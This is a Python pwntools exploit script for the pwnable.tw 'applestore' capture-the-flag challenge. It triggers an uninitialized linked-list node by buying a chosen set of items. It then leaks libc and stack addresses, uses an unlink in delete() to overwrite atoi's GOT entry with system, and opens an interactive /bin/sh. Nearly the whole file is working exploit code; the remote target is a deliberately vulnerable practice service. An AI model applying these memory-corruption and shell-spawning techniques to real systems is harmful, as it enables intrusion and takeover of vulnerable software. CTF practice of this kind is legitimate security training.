#!/usr/bin/env python3

import copy
import random
from pwn import *


DWORD = 4
context.terminal = ['tmux', 'splitw', '-h']

class Advasary:
    def __init__(self):
        self.elf = ELF('./pwninit/applestore_patched')
        self.libc = ELF('./given/libc_32.so.6')

    def conn(self):
        if args.REMOTE:
            return remote('chall.pwnable.tw', 10104)

        ld = ELF('./pwninit/ld-2.23.so')
        p = process([ld.path, self.elf.path], env={
            'LD_PRELOAD': self.libc.path
        })
        if args.GDB:
            gdb.attach(p, '\n'.join([
                # 'b *0x8048b98', # insert(iphone8) in checkout()
                # 'b *0x8048bd2', # ret in checkout()
                'b *0x8048a6f', # leave in delete()
                # 'b 0x8048a16', # atoi() in handler()
            ]))
        return p


    def exploit(self):
        self.p = self.conn()
        combinations = self.combination_sum([199, 299, 499, 399], 7174)
        combination = combinations[random.randint(0, len(combinations) - 1)]

        # vulnerabiltiy: uninitialized data on data treated as
        # a doubly linked list node:
        # we call this node "iphone8" because the vulnerability
        # are about purchasing the iphone8.
        num_items = self.buy_these(combination)
        iphone8_idx = num_items + 1 # 1-based index
        log.info(f'iphone8 should be at {iphone8_idx}')
        self.checkout_cart()

        ## Leak libc
        # call cart() function (list products) to leak arbitrary address
        # the y/n buffer allowed as to control the doubly linked list node.
        payload = b'yy' + p32(self.elf.got['puts']) + \
                  p32(1) + p32(0) + p32(0)
        self.p.sendlineafter(b'> ', b'4')
        self.p.sendlineafter(b'(y/n) > ', payload)
        self.p.recvuntil(f'{iphone8_idx}: '.encode())
        libc_leak = self.p.recvn(DWORD)
        libc_leak = u32(libc_leak)
        log.info(f'leak: {hex(libc_leak)}')
        self.libc.address = libc_leak - self.libc.symbols['puts']
        log.info(f'libc base: {hex(self.libc.address)}')

        ## Leak
        payload = [
            b'yy',
            p32(self.libc.sym['environ']), # leaking address
            p32(1), # node->price, don't care
            p32(0), # node->next, unused but NULL is safe
            p32(0), # node->prev, unused but NULL
        ]
        self.p.sendlineafter(b'> ', b'4')
        self.p.sendlineafter(b'(y/n) > ', b''.join(payload))
        self.p.recvuntil(f'{iphone8_idx}: '.encode())
        stack_leak = self.p.recvn(DWORD)
        stack_environ = u32(stack_leak)
        log.info(f'stack "environ" address: {hex(stack_environ)}')


        # call delete() function (delete node) to perform arbitrary write
        #  node.next.prev = node.prev
        #  node.prev.next = node.next
        # [HARD] write the saved ebp in delete() to got['atoi'] -0x22
        if args.REMOTE:
            # brute-force the offset...
            ebp_address = stack_environ - 0x104
        else:
            ebp_address = stack_environ - 0x108
        handler_buf_len = 0x22
        payload = [
            str(iphone8_idx).ljust(2, '\x00').encode(), # delete iphone8
            p32(0x0),                          # node->name
            p32(1),                            # node->price, don't care
            p32(self.elf.got['atoi'] + handler_buf_len),  #
            p32(ebp_address - 0x8),            # node +
        ]
        self.p.sendlineafter(b'> ', b'3')      # delete
        self.p.sendlineafter(b'Item Number> ', b''.join(payload))

        self.p.sendlineafter(b'> ', p32(self.libc.sym['system']) + b';/bin/sh;')
        self.p.interactive()

    def buy_these(self, counter: collections.Counter):
        price_to_device_number = {199: 1, 299: 2, 499: 3, 399: 4}
        num_items = 0
        for price, count in counter.items():
            num_items += count
            if count == 0:
                continue
            device_number = price_to_device_number[price]
            dev_num_bytes = str(device_number).encode()
            for _ in range(count):
                self.p.sendlineafter(b'> ', b'2')
                self.p.sendlineafter(b'Device Number>', dev_num_bytes)

        return num_items

    def checkout_cart(self):
        self.p.sendlineafter(b'> ', b'5')
        self.p.sendlineafter(b'ok? (y/n) >', b'y')

    def combination_sum(self, nums: list[int], target: int):
        results = []
        self._combination_sum(nums, target, 0,
                              collections.Counter(), results)
        return results

    def _combination_sum(self, nums, target, start, counter, combination):
        if target == 0:
            result = copy.copy(counter)
            combination.append(result)
            return

        for i in range(start, len(nums)):
            num = nums[i]
            if num > target:
                continue
            counter[num] += 1
            self._combination_sum(nums, target - num, i,
                                  counter, combination)
            counter[num] -= 1


if __name__ == '__main__':
    adv = Advasary()
    adv.exploit()
